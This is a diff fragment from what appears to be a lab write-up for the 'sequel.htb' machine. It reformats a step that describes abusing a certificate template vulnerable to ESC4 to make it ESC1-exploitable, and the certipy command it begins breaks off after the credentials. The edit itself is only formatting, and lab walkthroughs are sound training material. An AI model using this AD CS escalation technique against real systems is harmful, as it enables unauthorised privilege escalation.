@@ -594,7 +594,8 @@ Certificate Templates
 
 We found out that there is a `template` vulnerable to `ESC4`, which lets us to write to the template and make it vulnerable to an `ESC1` attack, the steps are as follows:
 
-1. Write to the template
+**Write to the template**
+
 ```bash
 certipy template \
     -u 'ca_svc@sequel.htb' -hashes '<REDACTED>' \
